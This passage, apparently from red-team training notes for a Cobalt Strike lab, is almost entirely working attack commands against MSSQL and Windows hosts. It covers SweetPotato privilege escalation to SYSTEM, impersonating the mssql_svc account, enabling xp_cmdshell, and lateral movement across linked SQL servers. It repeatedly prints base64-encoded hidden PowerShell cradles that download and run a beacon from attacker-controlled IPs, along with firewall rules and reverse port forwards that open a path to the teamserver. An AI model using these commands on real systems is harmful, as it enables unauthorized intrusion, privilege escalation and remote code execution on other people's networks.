beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
  
<span style=color:#75715e>#15 Check for *seimpersonate* privilege and if present run sweet potato exploit to abuse it to get Priv Esc to SYSTEM.</span>
<span style=color:#75715e># Encoded Powershell payload.</span>
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==
<span style=color:#75715e># Execute sweet potato to get reverse shell/beacon as system user.</span>
beacon&gt; execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==</span><span style=color:#e6db74>&#34;</span>
beacon&gt; connect localhost 4444
</code></pre></div></li><li><p>MSQSL Server - Enumeration</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## MSSQL Server - Enumeration</span>
<span style=color:#75715e># SQLRecon : https://github.com/skahwah/SQLRecon/wiki</span>
<span style=color:#75715e># PowerUpSQL : https://github.com/NetSPI/PowerUpSQL/wiki</span>
  
<span style=color:#75715e># 1. Use PowerUpSQL for enumerating MS SQL Server instances</span>
beacon&gt; powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon&gt; powerpick Get-SQLInstanceDomain
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum<span style=color:#960050;background-color:#1e0010>:</span>sqlspns
<span style=color:#75715e># Send network braodcast and UDP scan to identify any instance of sql db</span>
beacon&gt; powerpick Get-SQLInstanceBroadcast
beacon&gt; powerpick Get-SQLInstanceScanUDP
  
<span style=color:#75715e># 2-a. Check access to DB instance with current user session.</span>
beacon&gt; powerpick Get-SQLConnectionTest -Instance sql-2.dev.cyberbotic.io | fl
beacon&gt; powerpick Get-SQLServerInfo -Instance sql-2.dev.cyberbotic.io 
beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accessible</span><span style=color:#e6db74>&#34;</span> } | Get-SQLServerInfo
  
<span style=color:#75715e># 2-b. Find user that have access to SQL Servers.</span>
<span style=color:#75715e># Method-1 : Finding Users (or groups) which may have access to the SQL instance, We can look for appropriately named Domain Groups and their members.</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\Powerview.ps1
beacon&gt; powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
<span style=color:#75715e># Method-2 : Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges. (Check Notes for steps).</span>
<span style=color:#75715e># As the Domain Account running the SQL Service have its SPN, So the account may be kerberoastable. We can crack the hash to obtain plaintext password and use it to gain access to SQL instance.</span>
  
<span style=color:#75715e># 3. Check for sysadmin access  (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>info
  
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Enumerate for What roles we do have.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:whoami
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.dev.cyberbotic.io /m:lwhoami
  
<span style=color:#75715e># 4. Check if xp_cmdshell is enabled (0 -&gt; Disable, 1 -&gt; Enable), also check for sysadmin access.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.dev.cyberbotic.io /m:whoami
<span style=color:#75715e># if have sysadmin access , then enable it</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:ienablexp /i:DEV\mssql_svc
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.dev.cyberbotic.io /m:lenablexp /i:DEV\mssql_svc
  
<span style=color:#75715e># 5. Query execution</span>
beacon&gt; powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon&gt; powerpick Get-SQLQuery -Instance sql-2.dev.cyberbotic.io  -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@servername</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>exec master..xp_cmdshell &#39;whoami&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@servername</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@servername</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 6. Find the linked SQL Servers</span>
beacon&gt; powerpick Get-SQLServerLink -Instance sql-2.dev.cyberbotic.io 
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>exec master..xp_cmdshell &#39;whoami&#39;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span>
beacon&gt; powerpick Get-SQLQuery -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT * FROM OPENQUERY(&#39;sql-1.cyberbotic.io&#39;, &#39;select @@servername&#39;);</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span> -QueryTarget sql-1.cyberbotic.io
  
</code></pre></div></li><li><p>MSSQL Server - Impersonation</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## MSSQL Server - Impersonation</span>
  
<span style=color:#75715e># 1. Discover accounts which can be impersonated using impersonate module</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:impersonate
  
<span style=color:#75715e># 2-a. Impersonating a user account from current user using SQLRecon&#39;s &#34;impersonation mode&#34; by prefixing the module name with an i and specifying the principal to impersonate.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
  
<span style=color:#75715e># 2-b. OR Impersonating a user account from current user using SQL Querie (EXECUTE AS)</span>
SQL&gt; EXECUTE AS login = <span style=color:#e6db74>&#39;DEV\mssql_svc&#39;</span> ; SELECT SYSTEM_USER;
SQL&gt; EXECUTE AS login = <span style=color:#e6db74>&#39;DEV\mssql_svc&#39;</span> ; SELECT IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>);
<span style=color:#75715e># Check the current user access using SQL Queries (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span>
SQL&gt; SELECT SYSTEM_USER;
SQL&gt; SELECT IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>);
  
<span style=color:#75715e># 3. Check if after impersonation , we have acccess to sysadmin or xp_cmdshell is enabled.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iQuery /i:DEV\mssql_svc /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 4. Enable xp_cmdshell when we have sysadmin access</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iEnableXp /i:DEV\mssql_svc
</code></pre></div></li><li><p>MSSQL Server - Command Execution</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## MSSQL Server - Command Execution</span>
  
<span style=color:#75715e># 1. Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span>
SQL&gt; SELECT SYSTEM_USER;
SQL&gt; SELECT IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>);
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>info
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># Enumerate for What roles we do have.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
  
<span style=color:#75715e># 2. If current user have Sysadmin Access then Execute the command using inbuild module Invoke-SQLOSCmd from PowerUpSQL. (It automatically enables xp_cmdshell stored procedure and disables after code execution) -- Better OPSEC</span>
beacon&gt; powerpick Invoke-SQLOSCmd -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Command <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>whoami</span><span style=color:#e6db74>&#34;</span> -RawResults
  
<span style=color:#75715e># 3. Check if xp_cmdshell is enabled (0 -&gt; Disable, 1 -&gt; Enable)</span>
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 4. Manually Enable the xp_cmdshell stored procedure (manually + PowerUpSql + SQLRecon)</span>
SQL&gt; sp_configure <span style=color:#e6db74>&#39;Show Advanced Options&#39;</span>, 1; RECONFIGURE;
SQL&gt; sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, 1; RECONFIGURE;
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sp_configure &#39;Show Advanced Options&#39;, 1; RECONFIGURE;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
  
<span style=color:#75715e># 5. Command Execution when xp_xmdshell is enabled</span>
SQL&gt; EXEC xp_cmdshell <span style=color:#e6db74>&#39;whoami&#39;</span>
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC xp_cmdshell &#39;whoami&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
  
<span style=color:#75715e># 6. Get Remote shell or beacon access through Command Execution</span>
<span style=color:#75715e># 6-a. Check if smb port (445) is open on target machine. So we can decide from SMB Payload or pivot listener. If smb port is available the use SMB payload else create a pivot listener.</span>
beacon&gt; portscan 10.10.122.25 445
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>ping -n 1 &lt;TEAMSERVER-IP&gt;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># 6-b. Check if the Target SQL Server can connect to teamserver , if not then enable the port forwarding and add a firewall rule. (Need Admin Privilege)</span>
beacon&gt; powerpick New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>8080-In</span><span style=color:#e6db74>&#34;</span> -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon&gt; rportfwd 8080 127.0.0.1 80
  
<span style=color:#75715e># 6-c. For pivot listener</span>
<span style=color:#75715e># Create a pivot listener beacon &gt; Pivoting &gt; Listener and keep the settings same and change only port and name.</span>
beacon&gt; run netstat -anop tcp
<span style=color:#75715e># Setup a Scripted Web Delivery payload to /pivot endpoint and add the teamserver domain or IP and port 80 or 443 and select pivot listener.</span>
<span style=color:#75715e># Now go to initial beacon machine and enable port forwarding and firewall to facilitate the powershell script delivery.</span>
beacon&gt; powerpick New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>8080-In</span><span style=color:#e6db74>&#34;</span> -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; ping -n 1 10.10.123.102
<span style=color:#75715e># Now modify the payload as below</span>
powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://&lt;Initial-beacon-IP&gt;:8080/pivot&#39;))</span><span style=color:#e6db74>&#34;</span>
$ echo -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://&lt;Initial-beacon-IP&gt;:8080/pivot&#39;))</span><span style=color:#e6db74>&#34;</span> | iconv -t UTF-16LE | base64 -w 0
<span style=color:#75715e># Now execute the powershell script cradle in the target machine , and we should now have the access.</span>
<span style=color:#75715e># 6-d. Download and execute cradle</span>
powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://&lt;Initial-beacon-IP&gt;:8080/a&#39;))</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Convert into encoded format to prevent issues with quotes mismatch</span>
$ echo -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.56.139:80/a&#39;))</span><span style=color:#e6db74>&#34;</span> | iconv -t UTF-16LE | base64 -w 0
<span style=color:#75715e># Updated powershell cradle</span>
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADEAMAAyAC8AcABpAHYAbwB0ACcAKQApAA==
<span style=color:#75715e># 6-e. Execute the payload</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:ixpcmd /i:DEV\mssql_svc /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADEAMAAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAnACkAKQA=</span><span style=color:#e6db74>&#34;</span>
  
beacon&gt; powerpick Get-SQLQuery -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC xp_cmdshell &#39;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAnACkAKQA=&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#39;exec master..xp_cmdshell &#34;whoami&#34;&#39;</span> -QueryTarget eu-sql
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC xp_cmdshell &#39;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&#39;</span><span style=color:#e6db74>&#34;</span> -QueryTarget eu-sql
  
SQL&gt; SELECT * FROM OPENQUERY(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#39;select @@servername; exec xp_cmdshell &#39;&#39;powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=&#39;&#39;&#39;</span>)
  
</code></pre></div></li><li><p>MSSQL Server - Lateral Movement</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## MSSQL Server - Lateral Movement</span>
  
<span style=color:#75715e># 1-a. Find the linked SQL Servers</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 1-b. Execute query on the linked server</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 2. Check if xp_cmdshell is already enabled</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 3. Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>lwhoami
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span>
  
SQL&gt; SELECT SYSTEM_USER;
SQL&gt; SELECT IS_SRVROLEMEMBER(<span style=color:#e6db74>&#39;sysadmin&#39;</span>);
  
SQL&gt; SELECT * FROM OPENQUERY(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#39;select @@servername&#39;</span>);
SQL&gt; SELECT * FROM OPENQUERY(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#39;SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;);&#39;</span>);
  
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-2.dev.cyberbotic.io,1433</span><span style=color:#e6db74>&#34;</span> -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth<span style=color:#960050;background-color:#1e0010>:</span>wintoken /host<span style=color:#960050;background-color:#1e0010>:</span>sql-2.dev.cyberbotic.io /module<span style=color:#960050;background-color:#1e0010>:</span>info
<span style=color:#75715e># Enumerate for What roles we do have.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
  
<span style=color:#75715e># 4-a. If syadmin access is enabled then , We can just execute command by enabling the xp_cmdshell, executing command and then disabling it.</span>
SQL&gt; sp_configure <span style=color:#e6db74>&#39;Show Advanced Options&#39;</span>, 1; RECONFIGURE;
SQL&gt; sp_configure <span style=color:#e6db74>&#39;xp_cmdshell&#39;</span>, 1; RECONFIGURE;
  
SQL&gt; EXEC(<span style=color:#e6db74>&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;</span>) AT [sql-1.cyberbotic.io]
SQL&gt; EXEC(<span style=color:#e6db74>&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure;&#39;</span>) AT [sql-1.cyberbotic.io]
  
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sp_configure &#39;Show Advanced Options&#39;, 1; RECONFIGURE;</span><span style=color:#e6db74>&#34;</span> -QueryTarget eu-sql
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE;</span><span style=color:#e6db74>&#34;</span> -QueryTarget eu-sql
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#39;exec master..xp_cmdshell &#34;whoami&#34;&#39;</span> -QueryTarget eu-sql
<span style=color:#75715e># 4-b. Check if we can impersonate any user, and then check if that user have sysadmin role.</span>
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:impersonate
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
  
<span style=color:#75715e>#5. Now run powershell payload / execute cradle to get the beacon.</span>
<span style=color:#75715e># Follow point 6 of above Command Execution in MSSQL Notes.</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2 -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC xp_cmdshell &#39;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&#39;</span><span style=color:#e6db74>&#34;</span> -QueryTarget eu-sql
SQL&gt; SELECT * FROM OPENQUERY(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sql-1.cyberbotic.io</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#39;select @@servername; exec xp_cmdshell &#39;&#39;powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=&#39;&#39;&#39;</span>)
  
